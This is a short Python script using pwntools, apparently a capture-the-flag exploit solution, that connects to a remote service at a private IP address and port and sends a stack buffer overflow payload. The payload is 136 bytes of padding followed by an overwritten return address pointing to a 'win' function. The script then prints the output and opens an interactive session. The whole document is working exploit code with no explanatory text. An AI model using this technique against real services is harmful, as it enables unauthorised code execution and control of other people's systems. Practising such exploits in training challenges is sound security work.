from pwn import p64, remote


P = remote("10.212.173.64", 32_196)


def main() -> None:
    offset = 120 + 8 + 8
    win_addr = 0x4011D9

    payload = b"A" * offset
    payload += p64(win_addr)

    P.sendline(payload)

    print(P.recvall().decode(errors="ignore"))

    P.interactive()


if __name__ == "__main__":
    main()
